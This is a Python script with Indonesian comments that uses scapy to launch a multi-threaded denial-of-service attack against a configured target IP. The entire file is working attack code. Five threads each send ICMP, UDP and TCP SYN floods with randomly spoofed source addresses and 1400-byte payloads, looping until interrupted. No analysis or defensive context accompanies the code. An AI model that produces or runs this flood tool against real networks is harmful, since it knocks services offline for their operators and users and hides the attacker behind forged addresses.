from scapy.all import IP, ICMP, UDP, TCP, Raw, send, RandIP, RandShort
import threading
import time

# --- KONFIGURASI ---
target_ip = "192.168.0.118"  # GANTI DENGAN IP TARGET ANDA
# -------------------

# Konfigurasi multi-threading
NUM_ICMP_THREADS = 5
NUM_UDP_THREADS = 5
NUM_TCP_THREADS = 5
PACKETS_PER_BATCH = 50
PAYLOAD_SIZE = 1400  # Bytes (untuk ICMP dan UDP)

print(f"--- Memulai Combined Attack (ICMP + UDP + TCP SYN) ke {target_ip} ---")
print(f"Total Threads: {NUM_ICMP_THREADS + NUM_UDP_THREADS + NUM_TCP_THREADS}")
print(f"  - ICMP Threads: {NUM_ICMP_THREADS}")
print(f"  - UDP Threads: {NUM_UDP_THREADS}")
print(f"  - TCP SYN Threads: {NUM_TCP_THREADS}")
print(f"Batch Size: {PACKETS_PER_BATCH} packets | Payload: {PAYLOAD_SIZE} bytes")
print("Tekan Ctrl+C untuk berhenti.")

stop_attack = False

def icmp_attack_thread(thread_id):
    """Thread function untuk ICMP flood"""
    global stop_attack
    
    # Pre-build packet batch
    payload = Raw(load="X" * PAYLOAD_SIZE)
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        packet = IP(src=RandIP(), dst=target_ip) / ICMP() / payload
        packets.append(packet)
    
    print(f"[ICMP Thread {thread_id}] Started")
    
    while not stop_attack:
        try:
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[ICMP Thread {thread_id}] Error: {e}")
            break

def udp_attack_thread(thread_id):
    """Thread function untuk UDP flood"""
    global stop_attack
    
    # Pre-build packet batch
    payload = Raw(load="A" * PAYLOAD_SIZE)
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        packet = IP(src=RandIP(), dst=target_ip) / \
                 UDP(sport=RandShort(), dport=RandShort()) / \
                 payload
        packets.append(packet)
    
    print(f"[UDP Thread {thread_id}] Started")
    
    while not stop_attack:
        try:
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[UDP Thread {thread_id}] Error: {e}")
            break

def tcp_attack_thread(thread_id):
    """Thread function untuk TCP SYN flood"""
    global stop_attack
    
    # Pre-build packet batch
    packets = []
    for _ in range(PACKETS_PER_BATCH):
        packet = IP(src=RandIP(), dst=target_ip) / \
                 TCP(sport=RandShort(), dport=RandShort(), flags="S")
        packets.append(packet)
    
    print(f"[TCP Thread {thread_id}] Started")
    
    while not stop_attack:
        try:
            send(packets, verbose=0, inter=0)
        except Exception as e:
            if not stop_attack:
                print(f"[TCP Thread {thread_id}] Error: {e}")
            break

try:
    threads = []
    
    # Start ICMP threads
    for i in range(NUM_ICMP_THREADS):
        thread = threading.Thread(target=icmp_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    # Start UDP threads
    for i in range(NUM_UDP_THREADS):
        thread = threading.Thread(target=udp_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    # Start TCP threads
    for i in range(NUM_TCP_THREADS):
        thread = threading.Thread(target=tcp_attack_thread, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    # Keep main thread alive
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n--- Menghentikan serangan... ---")
    stop_attack = True
    time.sleep(2)  # Beri waktu thread untuk berhenti
    print("--- Serangan dihentikan ---")
